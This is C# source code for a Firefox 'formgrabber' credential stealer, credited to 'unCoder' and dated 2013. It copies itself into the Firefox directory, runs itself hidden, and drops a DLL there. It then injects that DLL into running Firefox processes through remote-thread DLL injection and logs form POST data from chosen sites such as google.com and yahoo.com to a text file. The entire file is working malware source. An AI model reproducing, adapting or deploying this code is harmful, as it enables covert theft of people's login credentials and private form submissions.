
/* 
 * 
 * Firefox formgrabber
 * Tested on : Firefox lastest version ( 23.0.1 ) - Windows 7 and 8 | 32 - 64 bit 
 * Coded By  : unCoder
 * Website   : www.dpcoders.com
 * 
 * all rights reserved | unCoder | Thursday, September 12, 2013
 * 
 */

using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;

namespace Logs
{
    class Program
    {

[DllImport("kernel32", SetLastError=true, CharSet = CharSet.Unicode)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll",SetLastError = true)]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte [] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
  uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProcess,
  IntPtr lpThreadAttributes, uint dwStackSize, IntPtr
  lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // -- Settings start -- //

        // true if using filter
        public bool UseFilter = true;

        // filter
        public string[] filter = { "google.com", "yahoo.com" };

        // logs saving diractory
        public string LogPath = "C:\\logs.txt";

        // -- Settings end -- //



        private string firefoxpath = "";
        private bool NotInvoked = true;

        private void AddToDB(string data) 
        {

            try
            {
               
                System.IO.File.AppendAllText(LogPath, "\r\n\r\n +============================+ \r\n\r\n" + data);
            }
            catch { }
        }

        
        private bool IsInFilter(string data)
        {
            try
            {
               
       
            if (UseFilter)
            {
                
                foreach (string ft in filter)
                {
                        if (data.Contains(ft.Trim()))
                            return true;
                }

                return false;
            }
            else { return true; }

            }
            catch { }
        
            return false;
        }

        private void InvokeHook()
        {
            try
            {
                Process[] prcs;

                    prcs = Process.GetProcesses();

                    foreach (Process p in prcs)
                    {
                        if (p.ProcessName.ToLower() == "firefox")
                        {

                            if (NotInvoked == true)
                            {
                                

                                IntPtr hProcess = p.Handle;
                                IntPtr Allocated = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)(firefoxpath + "loger.dll").Length, 0x1000, 0x40);

                                byte[] buff = System.Text.Encoding.ASCII.GetBytes(firefoxpath + "loger.dll");
                                UIntPtr x;

                                WriteProcessMemory(hProcess, Allocated, buff, (uint)buff.Length + 1, out x);
                                CreateRemoteThread(hProcess, IntPtr.Zero, 0, GetProcAddress(LoadLibrary("kernel32"), "LoadLibraryA"), Allocated, 0, IntPtr.Zero);

                                NotInvoked = false;
                            }

                            return;
                            
                        }
                    }

                    NotInvoked = true;

            }
            catch { }

        }

        private void Checker(string[] args)
        {
            bool IsPost = false;
            string data = "";
            
            // checking data
            try
            {
                // if form post data grabbed
                if (args[0] == "POST")
                {
                    // Get posted data ( form )
                    IsPost = true;
                    for (int i = 0; i < 500000000; i++)
                    {
                        data = data + args[i] + " ";
                    }

                }
            }
            catch { }

            // if it's post data
            if (IsPost)
            {
                // check data filter
               if (IsInFilter(data))
                    AddToDB(data);
            }
            else
            {

                    
                // if it's not post data
                // Invoke hook ( dll ) 
                ty:
                    System.Threading.Thread.Sleep(1000);

                    InvokeHook();
                    goto ty;
                
            }
        }

        static void Main(string[] args)
        {
            try 
            {

            object path = Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe", "", null);
            if (path != null)
                if (FileVersionInfo.GetVersionInfo(path.ToString()).FileMajorPart > 15)
                {
                    if (System.Text.RegularExpressions.Regex.Replace(path.ToString(), "firefox.exe", "loger.exe").Trim() == Process.GetCurrentProcess().MainModule.FileName.Trim())
                    {

                    try
                    {
                        System.IO.File.WriteAllBytes(System.Text.RegularExpressions.Regex.Replace(path.ToString(), "firefox.exe", "loger.dll"), Properties.Resources.Dll);
                    }
                    catch { }

                        System.Threading.Thread.Sleep(100);
                        
                        Program _logs = new Program();
                        _logs.firefoxpath = System.Text.RegularExpressions.Regex.Replace(path.ToString(), "firefox.exe", "");
                        _logs.Checker(args);
                    }
                    else
                    {
                        System.IO.File.Copy(Process.GetCurrentProcess().MainModule.FileName, System.Text.RegularExpressions.Regex.Replace(path.ToString(), "firefox.exe", "loger.exe"));

                        Process prcs = new Process();
                        prcs.StartInfo.FileName = System.Text.RegularExpressions.Regex.Replace(path.ToString(), "firefox.exe", "loger.exe");
                        prcs.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        prcs.Start();

                        System.Environment.Exit(0);
                    }  
                }
                else
                    return;

            } catch {}

        }


  
      }
}
